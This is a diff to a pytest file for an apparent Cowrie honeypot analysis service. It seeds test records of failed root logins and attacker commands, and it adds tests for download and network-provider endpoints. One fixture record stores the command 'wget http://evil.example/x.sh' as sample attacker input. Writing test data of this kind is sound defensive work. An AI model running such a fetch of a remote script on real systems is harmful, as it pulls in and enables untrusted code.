@@ -22,11 +22,14 @@ def client(tmp_path, monkeypatch):
     # one coordinated wave: 6 distinct IPs in the same minute
     for i in range(6):
         db.insert_attack(conn, timestamp="2026-06-22T11:24:30Z", src_ip="192.0.2." + str(i),
-                         event_type="cowrie.login.failed", username="root", password="123456")
+                         event_type="cowrie.login.failed", username="root", password="123456",
+                         asn="AS64500 Testnet", org="TestOrg")
     db.insert_attack(conn, timestamp="2026-06-22T11:30:00Z", src_ip="192.0.2.50",
                      event_type="cowrie.command.input", raw_command="uname -a")
     db.insert_attack(conn, timestamp="2026-06-22T11:31:00Z", src_ip="192.0.2.51",
                      event_type="cowrie.command.input", raw_command="uname -a")
+    db.insert_attack(conn, timestamp="2026-06-22T11:32:00Z", src_ip="192.0.2.52",
+                     event_type="cowrie.command.input", raw_command="wget http://evil.example/x.sh")
     conn.commit()
     conn.close()
     analysis_route._hibp_cache.clear()
@@ -70,6 +73,16 @@ def test_commands_endpoint(client):
 def test_botnet_endpoint(client):
     waves = client.get("/api/analysis/botnet", headers=AUTH).get_json()
     assert any(w["ip_count"] == 6 for w in waves)
+
+
+def test_downloads_endpoint(client):
+    rows = client.get("/api/analysis/downloads", headers=AUTH).get_json()
+    assert any("wget" in r["value"] for r in rows)
+
+
+def test_providers_endpoint(client):
+    rows = client.get("/api/analysis/providers", headers=AUTH).get_json()
+    assert rows and rows[0]["value"] == "AS64500 Testnet"
 
 
 def test_passwords_endpoint(client, monkeypatch):
